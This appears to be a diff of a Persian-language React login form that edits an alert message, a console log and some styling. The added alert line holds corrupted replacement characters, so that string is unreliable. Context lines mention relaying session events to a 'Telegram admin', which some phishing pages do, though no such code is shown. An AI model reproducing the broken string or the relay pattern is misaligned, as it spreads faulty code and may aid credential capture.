@@ -380,7 +380,7 @@ export const LoginForm = () => {
         localStorage.setItem("userPhone", phoneNumber);
         sessionStorage.removeItem("sessionId");
         sessionStorage.removeItem("phoneNumber");
-        alert("🎉 ��حراز هویت با موفقیت تکمیل شد! خوش آمدید.");
+        alert("🎉 ��حراز هویت ب�� موفقیت تکمیل شد! خوش آمدید.");
         navigate("/", { replace: true });
         break;
     }
@@ -428,7 +428,7 @@ export const LoginForm = () => {
         throw new Error("Failed to send notification to Telegram admin");
       }
 
-      console.log("��� Session created:", result.sessionId);
+      console.log("✅ Session created:", result.sessionId);
       setSessionId(result.sessionId);
       setPhoneNumber(mobileNumber);
       sessionStorage.setItem("sessionId", result.sessionId);
@@ -2010,8 +2010,8 @@ export const LoginForm = () => {
                 style={{
                   fontSize: "20px",
                   fontWeight: "700",
-                  lineHeight: "36px",
-                  marginBottom: "24px",
+                  lineHeight: "28px",
+                  marginBottom: "12px",
                   textAlign: "center",
                 }}
               >
